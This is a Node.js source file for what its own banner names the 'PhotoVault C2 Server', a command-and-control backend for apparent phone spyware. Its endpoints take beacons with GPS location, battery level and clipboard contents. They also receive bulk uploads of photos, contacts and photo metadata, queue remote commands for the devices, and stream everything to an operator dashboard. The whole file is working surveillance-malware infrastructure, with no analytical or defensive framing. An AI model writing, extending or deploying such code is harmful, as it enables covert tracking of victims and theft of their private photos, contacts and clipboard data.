const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const multer = require('multer');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const db = require('./db');

// Initialize
const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });
const PORT = 3002;
const startTime = Date.now();

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Ensure upload directories exist
const uploadsDir = path.join(__dirname, 'uploads');
const photosDir = path.join(uploadsDir, 'photos');
const contactsDir = path.join(uploadsDir, 'contacts');
[uploadsDir, photosDir, contactsDir].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// Database initialized in boot()

// Multer config for photo uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const deviceDir = path.join(photosDir, req.body.deviceId || 'unknown');
        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
        cb(null, deviceDir);
    },
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname) || '.jpg';
        const name = `${Date.now()}_${uuidv4().slice(0, 8)}${ext}`;
        cb(null, name);
    }
});
const upload = multer({ storage, limits: { fileSize: 100 * 1024 * 1024 } });

// ─── WebSocket ───────────────────────────────────────────────
const clients = new Set();

wss.on('connection', (ws) => {
    clients.add(ws);
    console.log(`[WS] Client connected (${clients.size} total)`);

    // Send initial stats
    try {
        const stats = db.getStats();
        stats.uptime = Math.floor((Date.now() - startTime) / 1000);
        ws.send(JSON.stringify({ type: 'stats', data: stats }));
    } catch (e) {
        console.error('[WS] Error sending initial stats:', e.message);
    }

    ws.on('close', () => {
        clients.delete(ws);
        console.log(`[WS] Client disconnected (${clients.size} total)`);
    });

    ws.on('error', (err) => {
        console.error('[WS] Error:', err.message);
        clients.delete(ws);
    });
});

function broadcast(data) {
    const msg = JSON.stringify(data);
    clients.forEach(client => {
        if (client.readyState === 1) {
            try { client.send(msg); } catch (e) { /* ignore */ }
        }
    });
}

// ─── Helper: update device status based on lastSeen ──────────
function updateDeviceStatus(device) {
    if (!device) return device;
    const now = Date.now();
    const lastSeen = new Date(device.lastSeen).getTime();
    const diff = now - lastSeen;

    if (diff < 2 * 60 * 1000) device.status = 'online';
    else if (diff < 10 * 60 * 1000) device.status = 'idle';
    else device.status = 'offline';

    return device;
}

// ─── API Routes ──────────────────────────────────────────────

// POST /api/beacon — receive device beacon
app.post('/api/beacon', (req, res) => {
    try {
        const body = req.body;
        const deviceId = body.deviceId;

        if (!deviceId) {
            return res.status(400).json({ error: 'deviceId required' });
        }

        // Accept both iOS naming (batteryLevel/latitude/longitude) and legacy (battery/lat/lng)
        const deviceName = body.deviceName || '';
        const model = body.model || '';
        const osVersion = body.osVersion || '';
        const battery = body.batteryLevel ?? body.battery ?? 0;
        const lat = body.latitude ?? body.lat ?? 0;
        const lng = body.longitude ?? body.lng ?? 0;
        const clipboard = body.clipboard || '';

        const device = db.upsertDevice({ deviceId, deviceName, model, osVersion, battery, lat, lng, clipboard });
        db.logBeacon({ deviceId, battery, lat, lng, clipboard });

        const pending = db.getPendingCommands(deviceId);
        // Parse params from JSON string back to object before sending
        const parsedCommands = pending.map(cmd => {
            let params = cmd.params;
            try { params = JSON.parse(params); } catch(e) {}
            return { id: cmd.id, type: cmd.type, ...params };
        });
        pending.forEach(cmd => db.markCommandSent(cmd.id));

        broadcast({ type: 'beacon', device: updateDeviceStatus(device) });

        console.log(`[BEACON] ${deviceName || deviceId} | Battery: ${battery}% | Lat: ${lat} Lng: ${lng}`);

        res.json({ status: 'ok', commands: parsedCommands });
    } catch (err) {
        console.error('[BEACON] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// POST /api/upload/photo — multipart photo upload
app.post('/api/upload/photo', upload.single('photo'), (req, res) => {
    try {
        const { deviceId, assetId } = req.body;
        if (!deviceId || !req.file) {
            return res.status(400).json({ error: 'deviceId and photo file required' });
        }

        const photo = db.addPhoto(
            deviceId,
            assetId || uuidv4(),
            req.file.originalname || req.file.filename,
            req.file.path,
            req.file.size
        );

        broadcast({ type: 'photo', deviceId, photo });

        console.log(`[PHOTO] ${deviceId} uploaded ${req.file.filename} (${(req.file.size / 1024).toFixed(1)}KB)`);

        res.json({ status: 'ok', id: photo.id });
    } catch (err) {
        console.error('[PHOTO] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// POST /api/upload/contacts — receive contacts dump
app.post('/api/upload/contacts', (req, res) => {
    try {
        const { deviceId, contacts } = req.body;
        if (!deviceId) {
            return res.status(400).json({ error: 'deviceId required' });
        }

        // Write to file
        const contactFile = path.join(contactsDir, `${deviceId}.json`);
        fs.writeFileSync(contactFile, JSON.stringify(contacts, null, 2));

        // Store in DB
        db.addContacts(deviceId, JSON.stringify(contacts));

        broadcast({ type: 'contacts', deviceId });

        console.log(`[CONTACTS] ${deviceId} uploaded ${Array.isArray(contacts) ? contacts.length : 0} contacts`);

        res.json({ status: 'ok' });
    } catch (err) {
        console.error('[CONTACTS] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// GET /api/devices — list all devices
app.get('/api/devices', (req, res) => {
    try {
        const devices = db.getDevices().map(d => updateDeviceStatus(d));
        res.json(devices);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/device/:deviceId — single device detail
app.get('/api/device/:deviceId', (req, res) => {
    try {
        const device = db.getDevice(req.params.deviceId);
        if (!device) return res.status(404).json({ error: 'Device not found' });
        res.json(updateDeviceStatus(device));
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/photos/:deviceId — paginated photos
app.get('/api/photos/:deviceId', (req, res) => {
    try {
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 50;
        const result = db.getPhotos(req.params.deviceId, page, limit);
        res.json(result);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/photo/:id — serve photo file
app.get('/api/photo/:id', (req, res) => {
    try {
        const photo = db.getPhotoById(parseInt(req.params.id));
        if (!photo) return res.status(404).json({ error: 'Photo not found' });

        const filePath = path.resolve(photo.path);
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found on disk' });
        }

        res.sendFile(filePath);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// POST /api/command — queue a command
app.post('/api/command', (req, res) => {
    try {
        const { deviceId, type, params } = req.body;
        if (!deviceId || !type) {
            return res.status(400).json({ error: 'deviceId and type required' });
        }

        const command = db.queueCommand(deviceId, type, params);
        broadcast({ type: 'command', deviceId, command });

        console.log(`[CMD] Queued '${type}' for ${deviceId}`);

        res.json({ status: 'ok', id: command.id, command });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/stats — server statistics
app.get('/api/stats', (req, res) => {
    try {
        const stats = db.getStats();
        stats.uptime = Math.floor((Date.now() - startTime) / 1000);
        res.json(stats);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/contacts/:deviceId — get contacts
app.get('/api/contacts/:deviceId', (req, res) => {
    try {
        const contacts = db.getContacts(req.params.deviceId);
        if (!contacts) return res.json({ data: null });

        let parsed;
        try {
            parsed = JSON.parse(contacts.data);
        } catch {
            parsed = contacts.data;
        }

        res.json({ data: parsed, uploadedAt: contacts.uploadedAt });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/activity — recent beacons
app.get('/api/activity', (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 50;
        const beacons = db.getRecentBeacons(limit);
        res.json(beacons);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/commands/:deviceId — command history
app.get('/api/commands/:deviceId', (req, res) => {
    try {
        const commands = db.getCommands(req.params.deviceId);
        res.json(commands);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// POST /api/command/result — receive command execution results from device
app.post('/api/command/result', (req, res) => {
    try {
        const { deviceId, commandId, status } = req.body;
        if (!commandId) {
            return res.status(400).json({ error: 'commandId required' });
        }

        const result = JSON.stringify(req.body);
        db.markCommandCompleted(commandId, result);

        broadcast({ type: 'command_result', deviceId, commandId, status, result: req.body });

        console.log(`[CMD_RESULT] ${deviceId} | cmd ${commandId} -> ${status}`);

        res.json({ status: 'ok' });
    } catch (err) {
        console.error('[CMD_RESULT] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// POST /api/upload/metadata — receive photo metadata dump
app.post('/api/upload/metadata', (req, res) => {
    try {
        const { deviceId, metadata } = req.body;
        if (!deviceId) {
            return res.status(400).json({ error: 'deviceId required' });
        }

        const metaFile = path.join(uploadsDir, `metadata_${deviceId}.json`);
        fs.writeFileSync(metaFile, JSON.stringify(metadata, null, 2));

        broadcast({ type: 'metadata', deviceId, count: Array.isArray(metadata) ? metadata.length : 0 });

        console.log(`[METADATA] ${deviceId} uploaded ${Array.isArray(metadata) ? metadata.length : 0} photo metadata entries`);

        res.json({ status: 'ok' });
    } catch (err) {
        console.error('[METADATA] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ─── Start Server ────────────────────────────────────────────
async function boot() {
    await db.initDB();
    console.log('[DB] Database initialized');

    server.listen(PORT, () => {
        console.log('');
        console.log('  ╔══════════════════════════════════════════╗');
        console.log('  ║         PhotoVault C2 Server             ║');
        console.log('  ╠══════════════════════════════════════════╣');
        console.log(`  ║  HTTP  → http://localhost:${PORT}           ║`);
        console.log(`  ║  WS    → ws://localhost:${PORT}             ║`);
        console.log('  ║  Dashboard → /                           ║');
        console.log('  ╚══════════════════════════════════════════╝');
        console.log('');
    });
}

boot().catch(err => {
    console.error('[FATAL] Boot failed:', err);
    process.exit(1);
});
